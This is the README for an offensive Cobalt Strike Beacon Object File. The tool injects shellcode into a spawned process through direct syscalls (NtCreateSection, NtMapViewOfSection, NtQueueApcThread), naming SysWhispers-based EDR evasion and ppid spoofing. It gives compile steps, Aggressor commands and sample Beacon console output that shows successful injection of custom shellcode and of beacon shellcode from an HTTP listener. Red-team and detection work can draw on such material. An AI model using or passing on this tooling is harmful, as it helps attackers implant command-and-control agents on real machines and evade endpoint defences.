## Spawn with Syscalls Shellcode Injection (NtMapViewOfSection -> NtQueueApcThread) BOF (64-bit only)

NtCreateSection -> NtMapViewOfSection -> NtQueueApcThread -> NtResumeThead.
Uses `BeaconSpawnTemporaryProcess` to create the target process. 

Syscalls generated using @jthuraisamy's [SysWhispers2](https://github.com/jthuraisamy/SysWhispers2), @FalconForce's [SysWhispers2BOF](https://github.com/FalconForceTeam/SysWhispers2BOF) and @Outflanknl's [InlineWhispers](https://github.com/outflanknl/InlineWhispers).

Code adapted from @peperunas's [injectopi](https://github.com/peperunas/injectopi/blob/master/CreateSectionAPC/CreateSectionAPC.cpp)

## Compile

```
make
```

## Usage

Aggressor script included with the following commands:
- `static_syscalls_apc_spawn listener_name` - Injects shellcode for beacon into a spawned process. 
- `static_syscalls_apc_shspawn path_to_bin` - Injects custom shellcode into a spawned process.

> NOTE: As we're using the beacon API for process spawn, we're not using syscalls, so bear that in mind. Spawning in this way does give us the spawnto, blockdlls and ppid spoofing settings applied though.  

### Custom shellcode
```
beacon> static_syscalls_apc_shspawn calc.bin
[*] Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)
[*] Reading shellcode from: calc.bin
[+] host called home, sent: 6354 bytes
[+] received output:
Spawned Process with PID: 10480
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> static_syscalls_apc_spawn http
[*] Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 267710 bytes
[+] received output:
Spawned Process with PID: 8648
[+] received output:
Shellcode injection completed successfully!
```
